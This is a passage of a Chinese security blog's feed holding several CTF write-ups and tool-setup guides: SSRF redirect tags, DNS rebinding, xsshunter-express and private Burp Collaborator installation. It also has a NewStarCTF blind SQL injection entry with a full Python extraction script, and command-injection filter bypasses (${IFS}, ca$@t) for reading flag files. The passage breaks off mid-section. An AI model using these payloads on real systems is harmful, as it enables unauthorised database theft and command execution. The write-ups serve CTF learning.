class="string">&quot;10000&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="2-、使用标签跳转内网">(2)、使用标签跳转内网</h4><p><code>&lt;meta&gt;</code>和<code>&lt;script&gt;</code>标签进行跳转。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;refresh&quot;</span> <span class="attr">content</span>=<span class="string">&quot;0; url=http://127.0.0.1/&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">window</span>.<span class="property">location</span>=<span class="string">&quot;http://127.0.0.1/&quot;</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="3-、使用标签引入内网">(3)、使用标签引入内网</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">embed</span> <span class="attr">src</span>=<span class="string">&quot;http://127.0.0.1/&quot;</span> <span class="attr">width</span>=<span class="string">&quot;600&quot;</span> <span class="attr">height</span>=<span class="string">&quot;800&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text/html&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">object</span> <span class="attr">data</span>=<span class="string">&quot;http://127.0.0.1/&quot;</span> <span class="attr">width</span>=<span class="string">&quot;600&quot;</span> <span class="attr">height</span>=<span class="string">&quot;800&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="DNS-rebinding">DNS rebinding</h3><p><a href="https://lock.cmpxchg8b.com/rebinder.html">https://lock.cmpxchg8b.com/rebinder.html</a></p><p>在请求时注意<code>CDN</code>缓存的问题，可以尝试修改请求的url。</p><p><a href="http://7f000001.c0a80001.rbndr.us/flag.html?11">http://7f000001.c0a80001.rbndr.us/flag.html?11</a></p><p><a href="http://7f000001.c0a80001.rbndr.us/flag.html?22">http://7f000001.c0a80001.rbndr.us/flag.html?22</a></p><p><a href="http://7f000001.c0a80001.rbndr.us/flag.html?33">http://7f000001.c0a80001.rbndr.us/flag.html?33</a></p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SSRF </tag>
            
            <tag> gopher协议 </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xsshunter-express搭建</title>
      <link href="/2024/07/22/xsshunter-express%E6%90%AD%E5%BB%BA/"/>
      <url>/2024/07/22/xsshunter-express%E6%90%AD%E5%BB%BA/</url>
      
        <content type="html"><![CDATA[<p>参考：<a href="https://www.youtube.com/watch?v=HF05dr8xhso&amp;t=377s">https://www.youtube.com/watch?v=HF05dr8xhso&amp;t=377s</a></p><h4 id="域名配置">域名配置</h4><p>首先配置一下自己的域名，以test.com域名为例，将xsshunter-express配置到域名xss.test.com上。</p><p>***注意：***我的服务器为腾讯云的香港服务器无需备案可访问。</p><p><img src="/2024/07/22/xsshunter-express%E6%90%AD%E5%BB%BA/1.png" alt></p><h4 id="开始安装">开始安装</h4><p>首先下载xsshunter-express</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/mandatoryprogrammer/xsshunter-express.git</span><br><span class="line">cd xsshunter-express/</span><br></pre></td></tr></table></figure><p>安装使用的是docker环境，修改docker的配置文件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim docker-compose.yml</span><br></pre></td></tr></table></figure><p>修改配置，将version修改为3.3，<a href="http://xn--HOSTNAMExss-o68qo3j09bh62acno8tqo72bkx9d.test.com">将HOSTNAME修改为你的域名xss.test.com</a>。如果只是想让xsshunter-express可以使用，这样就行了，需要登陆xss.test.com看一下xss是否触发。还可以配置邮箱接收自己的xss触发提醒，这里我为了方便没有配置，想配置可以参考原视频。</p><p><img src="/2024/07/22/xsshunter-express%E6%90%AD%E5%BB%BA/2.png" alt></p><p>开始安装</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d postgresdb</span><br><span class="line">docker-compose up xsshunterexpress</span><br></pre></td></tr></table></figure><p>安装成功，记一下密码。</p><p><img src="/2024/07/22/xsshunter-express%E6%90%AD%E5%BB%BA/3.png" alt></p><h4 id="测试">测试</h4><p>访问<a href="https://xss.test.com/admin/#/%EF%BC%8C%E8%BE%93%E5%85%A5%E4%BD%A0%E7%9A%84%E5%AF%86%E7%A0%81%E5%8D%B3%E5%8F%AF%E7%99%BB%E5%BD%95%E3%80%82">https://xss.test.com/admin/#/，输入你的密码即可登录。</a></p><p><img src="/2024/07/22/xsshunter-express%E6%90%AD%E5%BB%BA/4.png" alt></p><p><img src="/2024/07/22/xsshunter-express%E6%90%AD%E5%BB%BA/5.png" alt></p><p>在XSS PAYLOADS模块，随意找一个payload进行测试，我是用的<code>&lt;img&gt;</code>的测试标签。</p><p><img src="/2024/07/22/xsshunter-express%E6%90%AD%E5%BB%BA/6.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>搭建Burp Collaborator</title>
      <link href="/2024/07/21/%E6%90%AD%E5%BB%BABurp-Collaborator/"/>
      <url>/2024/07/21/%E6%90%AD%E5%BB%BABurp-Collaborator/</url>
      
        <content type="html"><![CDATA[<h2 id="要求">要求</h2><p>Docker、域名、BurpSuite、服务器Ubuntu 20（尽量选择香港服务器，域名不需要备案可访问）</p><h2 id="设置域名">设置域名</h2><p>去到自己的域名的DNS管理器。设置一个burp collaborator子域名，并将NS记录添加到你的burp collaborator子域名，一个A记录指向你的服务器，如下图所示。</p><p><img src="/2024/07/21/%E6%90%AD%E5%BB%BABurp-Collaborator/1.png" alt></p><p>NS记录的域名为你使用的BurpSuite Collaborator域名。</p><h2 id="环境设置">环境设置</h2><p>如果没有docker需要安装docker。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt update &amp;&amp; <span class="built_in">sudo</span> apt upgrade -y </span><br><span class="line"><span class="built_in">sudo</span> apt install docker.io</span><br></pre></td></tr></table></figure><p>安装docker以后，继续</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/integrity-sa/burpcollaborator-docker.git &amp;&amp; cd burpcollaborator-docker</span><br></pre></td></tr></table></figure><p><img src="/2024/07/21/%E6%90%AD%E5%BB%BABurp-Collaborator/2.png" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget <span class="string">&quot;https://portswigger.net/burp/releases/download?product=pro&amp;version=2021.10.3&amp;type=Jar&quot;</span></span><br><span class="line"><span class="built_in">mv</span> <span class="string">&#x27;download?product=pro&amp;version=2021.10.3&amp;type=Jar&#x27;</span> burp.jar &amp;&amp; <span class="built_in">mv</span> burp.jar ./burp/pkg/burp.jar</span><br></pre></td></tr></table></figure><p>确保将域名和IP替换为响应的域名和服务器IP</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./init.sh burp.hackplaza.net 20.119.42.229</span><br></pre></td></tr></table></figure><p>如果你遇到这样的错误。</p><p>Error starting userland proxy: listen tcp4 0.0.0.0:53: bind: address already in use.</p><p><img src="/2024/07/21/%E6%90%AD%E5%BB%BABurp-Collaborator/3.png" alt></p><p>使用下面的命令解决。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> systemctl stop systemd-resolved</span><br></pre></td></tr></table></figure><h2 id="入站规则">入站规则</h2><p>如果你再次遇到这样的错误。</p><p><img src="/2024/07/21/%E6%90%AD%E5%BB%BABurp-Collaborator/4.png" alt></p><p>你必须在网络组中进行一些更改才能允许入站链接。你必须相应地在VPS提供商中执行此操作。我正在使用Azure，所以这是如何做到的。</p><p>Click on VM &gt; Networking &gt; Add inbound port rule &gt; In Destination Port ranges keep * in it and finally click on Add</p><p>单击“VM”&gt;“网络&gt;”添加入站端口规则“&gt;”在目标端口范围中保留 *“，最后单击”添加”</p><p><img src="/2024/07/21/%E6%90%AD%E5%BB%BABurp-Collaborator/5.png" alt></p><p>再次运行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./init.sh burp.hackplaza.net 20.119.42.229</span><br></pre></td></tr></table></figure><p>将域名和服务器IP替换为你自己的IP。</p><p>成功完整的安装输出将如下所示：</p><p><img src="/2024/07/21/%E6%90%AD%E5%BB%BABurp-Collaborator/6.png" alt></p><h2 id="使用BurpSuite-Pro进行测试">使用BurpSuite Pro进行测试</h2><p>打开您的 Burp Suite Professional</p><p>Click on Project Options Tab &gt; Misc &gt; Burp Collaborator Server<br>单击“项目选项”选项卡 &gt; “杂项”&gt; Burp Collaborator Server</p><p>Select use private collaborator and do like shown in picture and click on Run Health check</p><p>选择使用private collaborator，并如图所示，然后单击运行运行状况检查</p><p><img src="/2024/07/21/%E6%90%AD%E5%BB%BABurp-Collaborator/7.png" alt></p><p>现在，您可以从BurpSuite Pro正常使用您的private Burp Collaborator服务器。</p><p>上述为原文的翻译部分，下面为自己安装时遇到的问题。</p><h2 id="配置问题">配置问题</h2><p><img src="/2024/07/21/%E6%90%AD%E5%BB%BABurp-Collaborator/8.png" alt></p><h2 id="证书问题">证书问题</h2><p>certbot默认生成证书使用的是EC算法，处理证书使用的是处理RSA证书的代码，所以需要修改证书为RSA证书。</p><p>/burpcollaborator-docker/certbot/new.sh</p><p>这个是生成证书的文件，在末尾加上<code>--key-type rsa</code>即可。</p><p><img src="/2024/07/21/%E6%90%AD%E5%BB%BABurp-Collaborator/9.png" alt></p><p>Burpsuite Collaborator配置</p><p><img src="/2024/07/21/%E6%90%AD%E5%BB%BABurp-Collaborator/10.png" alt></p><h2 id="其他问题">其他问题</h2><p><code>docker logs burp</code>查看burp报错的原因，找问题所在。</p><h2 id="参考">参考</h2><p><a href="https://hackplaza.net/2021/12/17/how-to-setup-private-burp-collaborator/">https://hackplaza.net/2021/12/17/how-to-setup-private-burp-collaborator/</a></p>]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> BurpSuite </tag>
            
            <tag> dnslog </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF做题记录</title>
      <link href="/2024/07/14/CTF%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
      <url>/2024/07/14/CTF%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h3 id="NewStarCTF-2023-web-week3-midsql-sql">[NewStarCTF 2023] web week3 midsql_sql</h3><p>通过布尔判断存在sql注入。</p><p><img src="/2024/07/14/CTF%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/sql_1.png" alt></p><p><img src="/2024/07/14/CTF%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/sql_2.png" alt></p><p><img src="/2024/07/14/CTF%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/sql_3.png" alt></p><p>数据库名为：<code>ctf</code>，<code>left('abcde',3)='abc'</code>从字符串的左边开始截取3个字符。</p><p><img src="/2024/07/14/CTF%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/sql_4.png" alt></p><p>经过测试发现，无法进行union注入，select等敏感函数被过滤，可通过大小写绕过。</p><p><img src="/2024/07/14/CTF%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/no_union.png" alt></p><p>关键函数<code>group_concat(table_name)</code>，将分组中的值连接组合，即这里将表名连接组合。通过此函数得到表名、列名。</p><p><img src="/2024/07/14/CTF%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/sql_5.png" alt></p><p><img src="/2024/07/14/CTF%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/sql_6.png" alt></p><p>利用到的payload如下</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; &amp;&amp; 1-- -</span></span><br><span class="line"><span class="string">&#x27;</span> <span class="operator">&amp;&amp;</span> <span class="number">0</span><span class="comment">-- -</span></span><br><span class="line"><span class="string">&#x27; &amp;&amp; if((length(database())=3),1,0)-- -</span></span><br><span class="line"><span class="string">&#x27;</span> <span class="operator">&amp;&amp;</span> <span class="keyword">left</span>(database(),<span class="number">3</span>)<span class="operator">=</span><span class="string">&#x27;ctf&#x27;</span><span class="comment">-- -</span></span><br><span class="line"><span class="string">&#x27; &amp;&amp; if(Ascii(Substr((Select Group_concat(table_name) From infOrmation_schema.tables Where Table_schema=&#x27;</span>ctf<span class="string">&#x27;),1,1))=t,1,0)-- -</span></span><br><span class="line"><span class="string">&#x27;</span> <span class="operator">&amp;&amp;</span> if(Ascii(Substr((<span class="keyword">Select</span> Group_concat(column_name) <span class="keyword">From</span> infOrmation_schema.columns <span class="keyword">Where</span> Table_name<span class="operator">=</span><span class="string">&#x27;here_is_flag&#x27;</span>),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span>t,<span class="number">1</span>,<span class="number">0</span>)<span class="comment">-- -</span></span><br></pre></td></tr></table></figure><p>通过上述的获取表名和列名的sql语句，通过字符的<strong>ASCII</strong>和<strong>t</strong>比较大小，可以利用二分法快速输出数据库名、表名、列名等信息。</p><p>个人感觉比较好用的poc如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">host = <span class="string">&quot;http://8bbb955c-7d10-474e-8234-4da0fb1ae4d9.node5.buuoj.cn:81/?id=TMP0919&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">DBname</span>():  </span><br><span class="line">    <span class="keyword">global</span> host</span><br><span class="line">    flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">1000</span>):</span><br><span class="line">        low = <span class="number">32</span></span><br><span class="line">        high = <span class="number">128</span></span><br><span class="line">        mid = (low+high)//<span class="number">2</span></span><br><span class="line">        <span class="keyword">while</span> low &lt; high:</span><br><span class="line">            <span class="comment">#--库名</span></span><br><span class="line">            payload = <span class="string">&quot;&#x27; %26%26 if(Ascii(Substr(database(),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)-- -&quot;</span>.<span class="built_in">format</span>(i=i, mid=mid)</span><br><span class="line">            res = requests.get(host + payload)</span><br><span class="line"></span><br><span class="line">            <span class="comment">#根据数据包的特征判断</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;Physics&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">                low = mid + <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                high = mid</span><br><span class="line">            mid = (low + high) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> mid == <span class="number">32</span> <span class="keyword">or</span> mid == <span class="number">127</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        flag += <span class="built_in">chr</span>(mid)</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;数据库名为：&quot;</span>+flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">TBname</span>():  </span><br><span class="line">    <span class="keyword">global</span> host</span><br><span class="line">    flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">1000</span>):</span><br><span class="line">        low = <span class="number">32</span></span><br><span class="line">        high = <span class="number">128</span></span><br><span class="line">        mid = (low+high)//<span class="number">2</span></span><br><span class="line">        <span class="keyword">while</span> low &lt; high:</span><br><span class="line">            <span class="comment">#--表名</span></span><br><span class="line">            payload = <span class="string">&quot;&#x27; %26%26 if(Ascii(Substr((Select Group_concat(table_name) From infOrmation_schema.tables Where Table_schema=&#x27;ctf&#x27;),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)-- -&quot;</span>.<span class="built_in">format</span>(i=i, mid=mid)</span><br><span class="line">            res = requests.get(host + payload)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;Physics&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">                low = mid + <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                high = mid</span><br><span class="line">            mid = (low + high) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> mid == <span class="number">32</span> <span class="keyword">or</span> mid == <span class="number">127</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        flag += <span class="built_in">chr</span>(mid)</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;数据表名为：&quot;</span>+flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">CLname</span>():  </span><br><span class="line">    <span class="keyword">global</span> host</span><br><span class="line">    flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">1000</span>):</span><br><span class="line">        low = <span class="number">32</span></span><br><span class="line">        high = <span class="number">128</span></span><br><span class="line">        mid = (low+high)//<span class="number">2</span></span><br><span class="line">        <span class="keyword">while</span> low &lt; high:</span><br><span class="line">            <span class="comment">#--列名</span></span><br><span class="line">            payload = <span class="string">&quot;&#x27; %26%26 if(Ascii(Substr((Select Group_concat(column_name) From infOrmation_schema.columns Where Table_name=&#x27;here_is_flag&#x27;),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)-- -&quot;</span>.<span class="built_in">format</span>(i=i, mid=mid)</span><br><span class="line">            res = requests.get(host + payload)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;Physics&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">                low = mid + <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                high = mid</span><br><span class="line">            mid = (low + high) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> mid == <span class="number">32</span> <span class="keyword">or</span> mid == <span class="number">127</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        flag += <span class="built_in">chr</span>(mid)</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;数据列名为：&quot;</span>+flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Valname</span>():  </span><br><span class="line">    <span class="keyword">global</span> host</span><br><span class="line">    flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">1000</span>):</span><br><span class="line">        low = <span class="number">32</span></span><br><span class="line">        high = <span class="number">128</span></span><br><span class="line">        mid = (low+high)//<span class="number">2</span></span><br><span class="line">        <span class="keyword">while</span> low &lt; high:</span><br><span class="line">            <span class="comment">#--报数据</span></span><br><span class="line">            payload = <span class="string">&quot;&#x27; %26%26 if(Ascii(Substr((Select Group_concat(flag) From here_is_flag),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)-- -&quot;</span>.<span class="built_in">format</span>(i=i, mid=mid)</span><br><span class="line">            res = requests.get(host + payload)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;Physics&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">                low = mid + <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                high = mid</span><br><span class="line">            mid = (low + high) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> mid == <span class="number">32</span> <span class="keyword">or</span> mid == <span class="number">127</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        flag += <span class="built_in">chr</span>(mid)</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;数据为：&quot;</span>+flag)</span><br><span class="line"></span><br><span class="line">DBname()</span><br><span class="line">TBname()</span><br><span class="line">CLname()</span><br><span class="line">Valname()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可得到flag</p><p><img src="/2024/07/14/CTF%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/flag.png" alt></p><p>参考</p><ul><li><a href="https://blog.csdn.net/m0_73512445/article/details/133694293">[NewStarCTF 2023] web题解</a></li></ul><h3 id="NewStarCTF-公开赛赛道-So-Baby-RCE">[NewStarCTF 公开赛赛道]So Baby RCE</h3><p>题目如下：</p><p><img src="/2024/07/14/CTF%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/rce_1.png" alt></p><p>发现代码中没有过滤<code>ls</code></p><p><img src="/2024/07/14/CTF%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/rce_2.png" alt></p><p>当前目录下什么东西，尝试跨目录读取文件，<code>cd </code>未过滤，<code>&amp;</code>未过滤，<code>cat</code>被过滤，通过添加特殊字符绕过<code>ca$@t</code>。记住$@特殊字符的使用，很多情况下可以绕过。</p><p><img src="/2024/07/14/CTF%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/rce_3.png" alt></p><p>Payload如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd%09..%26%26cd%09..%26%26cd%09..%26%26ls%26%26ca$@t%09ffff$@llllaaaaggggg</span><br></pre></td></tr></table></figure><h4 id="空格代替">空格代替</h4><p>命令执行中空格被过滤。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">&#123;IFS&#125;</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">IFS<span class="variable">$9</span></span></span><br><span class="line"><span class="meta prompt_">%</span><span class="language-bash">09</span></span><br></pre></td></tr></table></figure><p><img src="/2024/07/14/CTF%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/rce1_1_1.png" alt></p><blockquote><p><code>$IFS</code>在linux下表示分隔符，只有<code>cat$IFSa.txt</code>的时候，bash解析器会把整个IFSa当作变量名，所以导致没有办法运行，然而如果加上{}就固定了变量名，同理在后面加个$可以起到截断的作用。</p><p><code>$9</code>指的是当前系统shell进程的第九个参数的持有者，若没有9个参数，则为空，因此$9相当于没有加东西，等于做了一个前后隔离。</p></blockquote><p>不仅仅局限于<code>$9</code>，$加一个一位数字均可。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">echo &quot;参数1：&quot; $1</span><br><span class="line">echo &quot;参数2：&quot; $2</span><br><span class="line">echo &quot;参数3：&quot; $3</span><br><span class="line">echo &quot;参数4：&quot; $4</span><br><span class="line">echo &quot;参数5：&quot; $5</span><br><span class="line">echo &quot;参数6：&quot; $6</span><br><span class="line">echo &quot;参数7：&quot; $7</span><br><span class="line">echo &quot;参数8：&quot; $8</span><br><span class="line">echo &quot;参数9：&quot; $9</span><br><span class="line">echo &quot;参数10：&quot; $10</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">测试  ./test.sh a b c d c d e f g h</span> </span><br></pre></td></tr></table></figure><p>结果：</p><p><img src="/2024/07/14/CTF%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/rce1_1_2.png" alt></p><blockquote><p><code>$8、$9</code>因为没有传递参数，返回的结果为空。</p><p><code>$10</code>被解析成了<code>$1</code>和0，所以结果会是<code>a0</code>，若想获取第10个变量使用<code>$&#123;10&#125;</code>。</p></blockquote><h4 id="读取内容">读取内容</h4><p>列出目录</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tee #ls -l| tee 1.txt</span><br></pre></td></tr></table></figure><blockquote><p>tee命令通常的用法是将一个命令的输出保存到文件中，同时在终端上显示输出内容。</p></blockquote><p>读取文件</p><p><code>cat</code>被禁用，使用下列命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">cat   # 由第一行开始显示内容，并将所有内容输出</span><br><span class="line">tac   # 从最后一行倒序显示内容，并将所有内容输出</span><br><span class="line">more  # 根据窗口大小，一页一页的现实文件内容</span><br><span class="line">less  # 和more类似，但其优点可以往前翻页，而且进行可以搜索字符</span><br><span class="line">head  # 只显示头几行</span><br><span class="line">tail  # 只显示最后几行</span><br><span class="line">nl    # 类似于cat -n，显示时输出行号</span><br><span class="line">tailf # 类似于tail -f</span><br><span class="line">sort # 读文件</span><br></pre></td></tr></table></figure><h4 id="加特殊字符绕过">加特殊字符绕过</h4><p><code>cat</code>被禁用。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ca\t fl\ag.txt</span><br><span class="line"><span class="meta prompt_">ca$</span><span class="language-bash">@t fl<span class="variable">$@ag</span>.txt</span></span><br><span class="line">c&#x27;a&#x27;t flag.txt</span><br><span class="line">c&quot;a&quot;t flag.txt</span><br></pre></td></tr></table></figure><h4 id="编码绕过">编码绕过</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`echo 